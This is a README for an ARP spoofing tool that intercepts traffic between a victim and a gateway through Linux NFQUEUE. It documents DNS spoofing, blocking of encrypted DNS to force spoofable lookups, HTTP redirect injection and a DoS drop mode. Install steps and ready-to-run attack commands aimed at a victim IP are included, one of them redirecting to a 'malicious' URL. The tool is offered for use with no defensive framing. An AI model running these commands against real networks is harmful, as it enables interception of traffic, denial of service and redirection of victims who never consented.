# ARP Spoofer (NFQUEUE)

This project contains a powerful ARP spoofing tool that leverages Linux kernel forwarding and `NFQUEUE` (Netfilter Queue) to intercept, inspect, and modify traffic between a victim and a gateway.

It features a modular plugin system to extend functionality, such as DNS spoofing and HTTP redirection.

## Features

-   **ARP Poisoning**: Man-in-the-Middle (MITM) attack via ARP spoofing.
-   **Kernel Forwarding**: Uses `net.ipv4.ip_forward` for efficient routing.
-   **Traffic Interception**: Uses `iptables` and `NFQUEUE` to pass packets to userspace python script.
-   **Traffic Viewer**: Real-time summary of TCP/UDP flows (`--view`).
-   **Packet Dropping**: Selectively drop traffic (`--drop`).
-   **DNS Spoofing**:
    -   Spoof specific domains or all domains (`--dns-spoof-domain`).
    -   Redirect to custom IP (`--dns-spoof-ip`) or resolve a target URL's IP (`--dns-redirect-url`).
    -   **Force Plain DNS**: Aggressively blocks encrypted DNS (DoH/DoT/QUIC) to force victims to fall back to plain UDP/53 DNS, allowing spoofing (`--force-plain-dns`).
-   **HTTP Redirection**: Hijacks HTTP (port 80) sessions and injects 302 Redirects (`--redirect-url`).

## Prerequisites

The tool requires root privileges and the following system dependencies:

```bash
sudo apt update
sudo apt install libnetfilter-queue-dev
pip3 install scapy netfilterqueue
```

*(Note: In the provided environment, run with `sudo env/bin/python3 ...`)*

## Usage

```bash
sudo python3 arp_spoofer.py --iface <INTERFACE> --victim <VICTIM_IP> --gateway <GATEWAY_IP> [OPTIONS]
```

### Arguments

| Argument | Description |
| :--- | :--- |
| `--iface` | Network interface to use (e.g., `eth0`, `wlan0`). |
| `--victim` | IP address of the victim device. |
| `--gateway` | IP address of the gateway (router). |
| `--queue-num` | NFQUEUE queue number (default: 1). |
| `--view` | Enable verbose printing of traffic flows. |
| `--drop` | Drop ALL traffic from/to victim (DoS mode). |

### DNS Spoofing Options

| Argument | Description |
| :--- | :--- |
| `--dns-spoof-domain` | Domain to spoof (supports suffix match). Use `'*'` for all domains. |
| `--dns-spoof-ip` | IP address to return in spoofed DNS responses. |
| `--dns-redirect-url` | Resolve this URL's domain and use its IP as the spoof target (e.g., redirect google.com to youtube.com's IP). |
| `--force-plain-dns` | Block DoH (TCP/443 to known providers), DoT (TCP/853), and QUIC (UDP/443) to force fallback to plain DNS. |

### HTTP Redirection Options

| Argument | Description |
| :--- | :--- |
| `--redirect-url` | Target URL to redirect HTTP (Port 80) requests to. |

## Examples

**1. Basic Spy Mode (View Traffic):**
```bash
sudo python3 arp_spoofer.py --iface eth0 --victim 192.168.1.10 --gateway 192.168.1.1 --view
```

**2. DNS Spoofing with "Force Plain DNS" (Bypass DoH/DoT):**
redirect all traffic to `1.2.3.4`:
```bash
sudo python3 arp_spoofer.py --iface eth0 --victim 192.168.1.10 --gateway 192.168.1.1 \
    --dns-spoof-domain '*' --dns-spoof-ip 1.2.3.4 --force-plain-dns
```

**3. Rickroll (DNS Redirect):**
Redirect victim's DNS requests to resolve to YouTube's IP (Note: Host headers might break full site loading, but works for POCs):
```bash
sudo python3 arp_spoofer.py --iface eth0 --victim 192.168.1.10 --gateway 192.168.1.1 \
    --dns-spoof-domain '*' --dns-redirect-url https://www.youtube.com/watch?v=dQw4w9WgXcQ --force-plain-dns
```

**4. HTTP Redirection (Plain HTTP only):**
```bash
sudo python3 arp_spoofer.py --iface eth0 --victim 192.168.1.10 --gateway 192.168.1.1 \
    --redirect-url http://example.com/malicious
```

## Structure

-   `arp_spoofer.py`: Main entry point. Handles ARP cache poisoning and NFQUEUE binding.
-   `plugins/`: Folder containing packet processing plugins.
    -   `base.py`: Abstract base class for plugins.
    -   `dns_spoof.py`: Handles DNS inspection, spoofing, and DoH/DoT blocking.
    -   `http_redirect.py`: Handles HTTP packet injection for redirection.
